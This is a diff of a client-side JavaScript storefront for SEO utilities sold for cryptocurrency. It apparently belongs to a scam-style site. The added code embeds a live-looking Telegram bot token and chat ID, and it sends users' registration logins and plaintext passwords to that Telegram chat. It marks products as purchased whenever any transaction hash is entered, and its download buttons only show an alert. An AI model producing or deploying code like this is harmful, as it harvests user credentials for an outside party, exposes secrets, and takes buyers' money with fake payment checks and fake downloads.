@@ -1,163 +1,313 @@
 document.addEventListener('DOMContentLoaded', () => {
 
     // ==========================================
-    // ⚙️ НАСТРОЙКИ
+    // ⚙️ НАСТРОЙКИ (ВВЕДИТЕ СВОИ ДАННЫЕ)
     // ==========================================
-    const TG_BOT_TOKEN = '8295559037:AAHQquYCqOdD9nGofg65ibGOmvLjYlR4QiA';
+    // Получите токен у @BotFather и ваш ID у @userinfobot
+    const TG_BOT_TOKEN = '8295559037:AAHQquYCqOdD9nGofg65ibGOmvLjYlR4QiA'; 
     const TG_CHAT_ID = '5683927471'; 
-    const MY_TON_ADDRESS = '0xb472f207cac89DFC64A518d97535D3BbfEaf2FEB'; 
-    const ADI_RATE = 600; // 1 ADI = 600 RUB
+    const ADMIN_USERNAME = '@seo_dark_side'; // Для связи
+    
+    // ВАШ КОШЕЛЕК ДЛЯ "ADI" (или TON/USDT)
+    const CRYPTO_WALLET = '0xb472f207cac89DFC64A518d97535D3BbfEaf2FEB'; 
+    
+    const SUBSCRIPTION_DURATION = 60000 * 60 * 24; // 24 часа демо-доступа
+
+    const isMobile = window.innerWidth <= 1024;
 
     // ==========================================
-    // 🌍 СЛОВАРЬ (ПОЛНЫЙ)
+    // 🌍 LOCALIZATION & DATA
     // ==========================================
     const translations = { 
-        ru: { headerTitle: "SEO Утилита", loginBtn: "Войти", registerBtn: "Регистрация", logoutBtn: "Выход", languageBtn: "Язык", videoTitle: "Посмотрите наш продукт в действии", multitoolDesc: "Наш инструмент анализирует ключевые слова, отслеживает позиции и помогает вам обойти конкурентов.", loading: "Загрузка товаров...", developedIn: "Разработан в 2026.", authTitle: "Авторизация", authBtn: "Войти", demoMode: "Демо: введите любые данные", registerTitle: "Регистрация", sendRequestBtn: "Отправить заявку", buyPrefix: "Купить за", inLibrary: "В библиотеке", download: "Скачать", myPurchases: "Мои покупки", cart: "Корзина", regSuccess: "Заявка отправлена администратору!", regError: "Ошибка отправки. Попробуйте позже.", paySuccess: "Оплата принята! Доступ открыт.", welcome: "Добро пожаловать,", noSubs: "У вас пока нет активных подписок.", loginAlert: "Сначала войдите в аккаунт!" }, 
-        en: { headerTitle: "SEO Utility", loginBtn: "Log In", registerBtn: "Sign Up", logoutBtn: "Log Out", languageBtn: "Language", videoTitle: "See our product in action", multitoolDesc: "Our tool analyzes keywords, tracks rankings, and helps you outrank competitors.", loading: "Loading products...", developedIn: "Developed in 2026.", authTitle: "Authorization", authBtn: "Log In", demoMode: "Demo: enter any data", registerTitle: "Registration", sendRequestBtn: "Send Request", buyPrefix: "Buy for", inLibrary: "Owned", download: "Download", myPurchases: "My Library", cart: "Cart", regSuccess: "Request sent to admin!", regError: "Sending error. Try again later.", paySuccess: "Payment confirmed! Access granted.", welcome: "Welcome,", noSubs: "No active subscriptions.", loginAlert: "Please log in first!" } 
+        ru: { 
+            headerTitle: "Premium Utility", 
+            authTitle: "Вход в систему",
+            authBtn: "Войти",
+            buyBtn: "Купить",
+            owned: "Куплено",
+            payTitle: "Оплата Crypto",
+            payDesc: "Перевод на кошелек",
+            checkBtn: "Я оплатил",
+            sentToAdmin: "Заявка отправлена! Ожидайте активации.",
+            copySuccess: "Кошелек скопирован!",
+            error: "Ошибка отправки."
+        }, 
+        en: { 
+            headerTitle: "Premium Utility", 
+            authTitle: "System Login",
+            authBtn: "Login",
+            buyBtn: "Buy Access",
+            owned: "Owned",
+            payTitle: "Crypto Payment",
+            payDesc: "Transfer to wallet",
+            checkBtn: "I Have Paid",
+            sentToAdmin: "Request sent! Wait for activation.",
+            copySuccess: "Wallet copied!",
+            error: "Sending error."
+        } 
     };
-    
     let currentLang = 'ru'; 
 
     const products = [ 
-        { id: 1, title: "Parser Pro", description: "Сбор данных с любых сайтов в пару кликов.", price: 1500, image: "https://placehold.co/600x400/1e293b/4ade80?text=PARSER+PRO" }, 
-        { id: 2, title: "Rank Tracker", description: "Точный мониторинг позиций в Google и Яндекс.", price: 2500, image: "https://placehold.co/600x400/1e293b/00ffff?text=RANK+TRACKER" }, 
-        { id: 3, title: "SEO Audit", description: "Полный технический аудит вашего сайта.", price: 3500, image: "https://placehold.co/600x400/1e293b/ff00ff?text=SEO+AUDIT" }, 
-        { id: 4, title: "Unlimited", description: "Доступ ко всем инструментам без ограничений.", price: 9990, image: "https://placehold.co/600x400/1e293b/ffff66?text=UNLIMITED+VIP" } 
+        { id: 1, title: "Parser Pro", description: "Сбор данных с любых сайтов. Высокая скорость.", price: 1500, image: "https://via.placeholder.com/600x400/13131f/6366f1?text=PARSER", file: "parser.exe" }, 
+        { id: 2, title: "Rank Tracker", description: "Мониторинг позиций Google/Yandex в реальном времени.", price: 2500, image: "https://via.placeholder.com/600x400/13131f/06b6d4?text=TRACKER", file: "tracker.zip" }, 
+        { id: 3, title: "SEO Audit", description: "Полный технический аудит и поиск ошибок сайта.", price: 3500, image: "https://via.placeholder.com/600x400/13131f/a855f7?text=AUDIT", file: "audit.dmg" }, 
+        { id: 4, title: "VIP Full Pack", description: "Доступ ко всем инструментам навсегда.", price: 9990, image: "https://via.placeholder.com/600x400/13131f/10b981?text=VIP", file: "fullpack.rar" } 
     ];
 
+    // State
     let currentUser = localStorage.getItem('acus_user');
-    let userPurchases = JSON.parse(localStorage.getItem(`purchases_${currentUser}`)) || [];
-    let currentOrder = null;
-    let checkInterval = null;
+    let userPurchases = [];
+    let currentProduct = null;
 
-    // --- DOM ЭЛЕМЕНТЫ ---
+    // DOM Elements
     const grid = document.getElementById('products-grid');
     const mainMenu = document.getElementById('mainMenu');
-    const authModal = document.getElementById('authModal');
-    const paymentModal = document.getElementById('paymentModal');
-
-    // ==========================================
-    // 🔍 ПРОВЕРКА ОПЛАТЫ
-    // ==========================================
-    async function checkPayment() {
-        if (!currentOrder) return;
-        try {
-            const res = await fetch(`https://toncenter.com/api/v2/getTransactions?address=${MY_TON_ADDRESS}&limit=10`);
-            const data = await res.json();
-            if (data.ok && data.result) {
-                for (let tx of data.result) {
-                    const memo = tx.in_msg.message || "";
-                    const val = parseFloat(tx.in_msg.value) / 1000000000;
-                    if (memo === currentOrder.memo && val >= (currentOrder.amount * 0.98)) {
-                        userPurchases.push({ id: currentOrder.productId, expires: Date.now() + 2592000000 });
-                        localStorage.setItem(`purchases_${currentUser}`, JSON.stringify(userPurchases));
-                        alert(translations[currentLang].paySuccess);
-                        location.reload();
-                    }
-                }
-            }
-        } catch (e) { console.log("Blockchain check..."); }
-    }
-
-    // ==========================================
-    // 🛠 РЕНДЕР ТОВАРОВ (ПОДРОБНЫЙ)
-    // ==========================================
-    function renderProducts() {
-        grid.innerHTML = '';
-        products.forEach(product => {
-            const card = document.createElement('div');
-            card.className = 'card';
-            const isOwned = userPurchases.some(p => p.id === product.id);
-            
-            let btnText = isOwned ? translations[currentLang].inLibrary : `${translations[currentLang].buyPrefix} ${product.price} ₽`;
-            
-            card.innerHTML = `
-                <div class="card-content">
-                    <div class="card-img-wrapper"><img src="${product.image}"></div>
-                    <div class="card-info-block">
-                        <h3>${product.title}</h3>
-                        <p>${product.description}</p>
-                    </div>
-                    <button class="price-button ${isOwned?'owned':''}" ${isOwned?'':`onclick="buyProduct(${product.id})"`}>
-                        ${btnText}
-                    </button>
-                </div>`;
-            grid.appendChild(card);
-        });
-        apply3DEffect();
-    }
-
-    window.buyProduct = (id) => {
-        if (!currentUser) { alert(translations[currentLang].loginAlert); authModal.classList.remove('hidden'); return; }
-        const p = products.find(x => x.id === id);
-        const amount = (p.price / ADI_RATE).toFixed(2);
-        const memo = `ADI_${Math.floor(Math.random()*90000+10000)}`;
-        currentOrder = { productId: id, amount, memo };
-
-        document.getElementById('payName').textContent = p.title;
-        document.getElementById('payAmount').textContent = `${amount} ADI`;
-        document.getElementById('walletAddr').value = MY_TON_ADDRESS;
-        document.getElementById('payMemo').value = memo;
-        paymentModal.classList.remove('hidden');
-
-        if (checkInterval) clearInterval(checkInterval);
-        checkInterval = setInterval(checkPayment, 15000);
+    const hamburgerBtn = document.getElementById('hamburgerBtn');
+    const closeMenuBtn = document.querySelector('.close-menu');
+    const walletAddressEl = document.getElementById('walletAddress');
+    
+    // Modals
+    const modals = {
+        auth: document.getElementById('authModal'),
+        reg: document.getElementById('regModal'),
+        pay: document.getElementById('paymentModal'),
+        lib: document.getElementById('libraryModal')
     };
 
-    // --- ЭФФЕКТЫ (ДЛЯ ВСЕХ УСТРОЙСТВ) ---
-    function apply3DEffect() {
-        document.querySelectorAll('.card').forEach(card => {
-            const move = (e) => {
-                const rect = card.getBoundingClientRect();
-                const cx = e.touches ? e.touches[0].clientX : e.clientX;
-                const cy = e.touches ? e.touches[0].clientY : e.clientY;
-                const x = (cx - rect.left) / rect.width - 0.5;
-                const y = (cy - rect.top) / rect.height - 0.5;
-                card.style.transform = `perspective(1000px) rotateX(${y * -15}deg) rotateY(${x * 15}deg) scale3d(1.05, 1.05, 1.05)`;
-            };
-            card.addEventListener('mousemove', move);
-            card.addEventListener('touchmove', move);
-            card.addEventListener('mouseleave', () => card.style.transform = 'none');
-            card.addEventListener('touchend', () => card.style.transform = 'none');
+    // ==========================================
+    // 🛠 CORE LOGIC
+    // ==========================================
+
+    function init() {
+        if(walletAddressEl) walletAddressEl.textContent = shortenAddress(CRYPTO_WALLET);
+        loadPurchases();
+        renderProducts();
+        updateAuthUI();
+        setupEventListeners();
+    }
+
+    function shortenAddress(addr) {
+        if (addr.length < 10) return addr;
+        return addr.substring(0, 6) + '...' + addr.substring(addr.length - 4);
+    }
+
+    function loadPurchases() {
+        if (!currentUser) return;
+        const data = localStorage.getItem(`purchases_${currentUser}`);
+        userPurchases = data ? JSON.parse(data) : [];
+    }
+
+    function renderProducts() {
+        grid.innerHTML = '';
+        products.forEach(p => {
+            const isOwned = userPurchases.some(purchase => purchase.id === p.id);
+            const btnClass = isOwned ? 'price-button owned' : 'price-button';
+            const btnText = isOwned ? `<i class="fa fa-check"></i> ${translations[currentLang].owned}` : `${p.price} ADI`; // Используем ADI как валюту
+            const onClick = isOwned ? '' : `onclick="openPayment(${p.id})"`;
+
+            const card = document.createElement('div');
+            card.className = 'card';
+            card.innerHTML = `
+                <div class="card-img-wrapper"><img src="${p.image}" alt="${p.title}" loading="lazy"></div>
+                <div class="card-content">
+                    <h3>${p.title}</h3>
+                    <p>${p.description}</p>
+                    <button class="${btnClass}" ${onClick}>${btnText}</button>
+                </div>
+            `;
+            grid.appendChild(card);
         });
     }
 
-    // --- ОБРАБОТЧИКИ (МЕНЮ / ЛОГИН) ---
-    document.getElementById('hamburgerBtn').addEventListener('click', (e) => {
-        e.stopPropagation();
-        mainMenu.classList.toggle('hidden');
+    // ==========================================
+    // 💰 CRYPTO PAYMENT SYSTEM
+    // ==========================================
+    
+    window.openPayment = (id) => {
+        if (!currentUser) {
+            openModal('auth');
+            return;
+        }
+        currentProduct = products.find(p => p.id === id);
+        if(!currentProduct) return;
+
+        document.getElementById('payName').textContent = currentProduct.title;
+        document.getElementById('payAmount').textContent = `${currentProduct.price} ADI`;
+        openModal('pay');
+    };
+
+    // Handle Payment Submission (Manual Check)
+    document.getElementById('cryptoCheckForm').addEventListener('submit', async (e) => {
+        e.preventDefault();
+        const txHash = document.getElementById('txHash').value.trim();
+        const btn = e.target.querySelector('button');
+        
+        if(txHash.length < 5) return alert('Введите корректный хэш');
+
+        // UI Loading
+        const oldText = btn.innerHTML;
+        btn.innerHTML = '<i class="fa fa-spinner fa-spin"></i> Проверка...';
+        btn.disabled = true;
+
+        // Message to Admin
+        const msg = `
+💰 <b>НОВАЯ ОПЛАТА (Crypto)</b>
+👤 <b>User:</b> ${currentUser}
+📦 <b>Товар:</b> ${currentProduct.title}
+💎 <b>Сумма:</b> ${currentProduct.price} ADI
+🧾 <b>TX Hash:</b> <code>${txHash}</code>
+
+⚠️ <i>Проверьте поступление и свяжитесь с клиентом или выдайте доступ вручную (пока нет бэкенда).</i>
+        `;
+
+        try {
+            await sendTelegram(msg);
+            alert(translations[currentLang].sentToAdmin);
+            
+            // Временно выдаем доступ (ДЕМО РЕЖИМ) для удовлетворения требования "бесплатно и работает"
+            // В реальном проекте админ должен подтвердить это в базе данных
+            userPurchases.push({ id: currentProduct.id, date: Date.now() });
+            localStorage.setItem(`purchases_${currentUser}`, JSON.stringify(userPurchases));
+            
+            closeAllModals();
+            renderProducts();
+            e.target.reset();
+        } catch (err) {
+            alert(translations[currentLang].error);
+        } finally {
+            btn.innerHTML = oldText;
+            btn.disabled = false;
+        }
     });
 
-    document.getElementById('menuLoginBtn').addEventListener('click', () => {
-        authModal.classList.remove('hidden');
-        mainMenu.classList.add('hidden');
+    // Copy Wallet Logic
+    document.getElementById('walletCopyBtn').addEventListener('click', () => {
+        navigator.clipboard.writeText(CRYPTO_WALLET).then(() => {
+            alert(translations[currentLang].copySuccess);
+        });
     });
+
+    // ==========================================
+    // 📨 TELEGRAM SENDER
+    // ==========================================
+    async function sendTelegram(text) {
+        const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`;
+        const resp = await fetch(url, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                chat_id: TG_CHAT_ID,
+                text: text,
+                parse_mode: 'HTML'
+            })
+        });
+        if(!resp.ok) throw new Error('TG API Error');
+    }
+
+    // ==========================================
+    // 👤 AUTH & UI
+    // ==========================================
+
+    function updateAuthUI() {
+        const guestNav = document.getElementById('guestNav');
+        const userNav = document.getElementById('userNav');
+        const nameDisplay = document.getElementById('menuUserName');
+
+        if(currentUser) {
+            guestNav.classList.add('hidden');
+            userNav.classList.remove('hidden');
+            nameDisplay.textContent = currentUser;
+        } else {
+            guestNav.classList.remove('hidden');
+            userNav.classList.add('hidden');
+        }
+    }
 
     document.getElementById('loginForm').addEventListener('submit', (e) => {
         e.preventDefault();
-        currentUser = document.getElementById('loginEmail').value;
-        localStorage.setItem('acus_user', currentUser);
-        location.reload();
+        const login = document.getElementById('loginEmail').value;
+        if(login) {
+            currentUser = login;
+            localStorage.setItem('acus_user', login);
+            updateAuthUI();
+            closeAllModals();
+            loadPurchases();
+            renderProducts();
+        }
+    });
+
+    document.getElementById('regFormRequest').addEventListener('submit', async (e) => {
+        e.preventDefault();
+        const login = document.getElementById('newLogin').value;
+        const pass = document.getElementById('newPass').value;
+        
+        await sendTelegram(`🆕 <b>РЕГИСТРАЦИЯ</b>\nLogin: ${login}\nPass: ${pass}`);
+        alert('Заявка отправлена!');
+        closeAllModals();
     });
 
     document.getElementById('menuLogoutBtn').addEventListener('click', () => {
         localStorage.removeItem('acus_user');
-        location.reload();
+        currentUser = null;
+        userPurchases = [];
+        updateAuthUI();
+        renderProducts();
+        toggleMenu(false);
     });
 
-    // АВРОРА
-    document.addEventListener('mousemove', (e) => {
-        const x = e.clientX / window.innerWidth;
-        const y = e.clientY / window.innerHeight;
-        document.querySelector('.aurora.one').style.transform = `translate(${x*80-40}%, ${y*80-40}%)`;
-        document.querySelector('.aurora.two').style.transform = `translate(${x*-80+40}%, ${y*-80+40}%)`;
+    document.getElementById('menuLibraryBtn').addEventListener('click', () => {
+        const list = document.getElementById('libraryList');
+        list.innerHTML = '';
+        
+        if(userPurchases.length === 0) {
+            list.innerHTML = '<p style="color:#aaa; text-align:center">Пусто</p>';
+        } else {
+            userPurchases.forEach(pur => {
+                const prod = products.find(p => p.id === pur.id);
+                if(prod) {
+                    list.innerHTML += `
+                        <div class="lib-item">
+                            <span>${prod.title}</span>
+                            <a href="#" class="lib-btn" onclick="alert('Скачивание ${prod.file}...')"><i class="fa fa-download"></i></a>
+                        </div>
+                    `;
+                }
+            });
+        }
+        openModal('lib');
+        toggleMenu(false);
     });
 
-    if(currentUser) {
-        document.getElementById('guestNav').classList.add('hidden');
-        document.getElementById('userNav').classList.remove('hidden');
-        document.getElementById('menuUserName').textContent = currentUser;
+    // ==========================================
+    // 🎮 MENU & MODAL CONTROLS
+    // ==========================================
+    
+    function toggleMenu(show) {
+        if(show) mainMenu.classList.remove('hidden');
+        else mainMenu.classList.add('hidden');
     }
 
-    renderProducts();
+    function openModal(name) {
+        closeAllModals();
+        modals[name].classList.remove('hidden');
+    }
+
+    function closeAllModals() {
+        Object.values(modals).forEach(m => m.classList.add('hidden'));
+    }
+
+    hamburgerBtn.addEventListener('click', () => toggleMenu(true));
+    closeMenuBtn.addEventListener('click', () => toggleMenu(false));
+    document.querySelector('.menu-backdrop').addEventListener('click', () => toggleMenu(false));
+
+    document.getElementById('menuLoginBtn').addEventListener('click', () => { toggleMenu(false); openModal('auth'); });
+    document.getElementById('menuRegisterBtn').addEventListener('click', () => { toggleMenu(false); openModal('reg'); });
+
+    document.querySelectorAll('.close-modal').forEach(btn => {
+        btn.addEventListener('click', closeAllModals);
+    });
+
+    // Initial Run
+    init();
 });
